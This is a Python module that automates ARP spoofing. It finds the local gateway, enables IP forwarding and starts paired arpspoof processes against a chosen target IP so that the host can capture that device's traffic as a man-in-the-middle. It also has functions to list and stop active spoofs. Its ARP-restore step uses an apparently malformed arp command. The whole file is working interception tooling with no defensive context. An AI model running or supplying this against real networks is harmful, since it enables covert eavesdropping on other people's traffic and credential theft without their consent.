import subprocess
import threading
import os
import time

_spoof_procs = {}  # ip -> (proc1, proc2)
_spoof_lock  = threading.Lock()

def _get_gateway():
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        import re
        m = re.search(r"default via ([\d.]+)", out)
        return m.group(1) if m else "192.168.31.1"
    except Exception:
        return "192.168.31.1"

def _enable_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        return True
    except PermissionError:
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception:
            return False

def _disable_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0\n")
    except Exception:
        pass

def start_spoof(target_ip, iface="wlan0"):
    """Start ARP spoofing against target_ip so we can capture its traffic."""
    with _spoof_lock:
        if target_ip in _spoof_procs:
            return {"status": "already_running", "target": target_ip}

        gateway = _get_gateway()
        _enable_forwarding()

        # arpspoof -i iface -t target gateway  (tell target: I am the gateway)
        # arpspoof -i iface -t gateway target  (tell gateway: I am the target)
        try:
            p1 = subprocess.Popen(
                ["/usr/bin/arpspoof", "-i", iface, "-t", target_ip, gateway],
                stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
            )
            time.sleep(1)
            if p1.poll() is not None:
                err = p1.stderr.read().decode(errors='replace').strip()
                return {"status": "error", "error": f"arpspoof failed (needs root): {err or 'permission denied'}"}
            p2 = subprocess.Popen(
                ["/usr/bin/arpspoof", "-i", iface, "-t", gateway, target_ip],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            _spoof_procs[target_ip] = (p1, p2)
            return {"status": "started", "target": target_ip, "gateway": gateway}
        except Exception as e:
            return {"status": "error", "error": str(e)}

def stop_spoof(target_ip):
    """Stop ARP spoofing and restore ARP tables."""
    with _spoof_lock:
        if target_ip not in _spoof_procs:
            return {"status": "not_running"}
        p1, p2 = _spoof_procs.pop(target_ip)
        try: p1.terminate()
        except Exception: pass
        try: p2.terminate()
        except Exception: pass
        # Restore ARP — send correct ARP replies
        gateway = _get_gateway()
        try:
            subprocess.run(
                ["arp", "-s", target_ip, "-d"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        except Exception:
            pass
        if not _spoof_procs:
            _disable_forwarding()
        return {"status": "stopped", "target": target_ip}

def stop_all_spoofs():
    for ip in list(_spoof_procs.keys()):
        stop_spoof(ip)

def is_spoofing(target_ip):
    return target_ip in _spoof_procs

def list_spoofs():
    return list(_spoof_procs.keys())
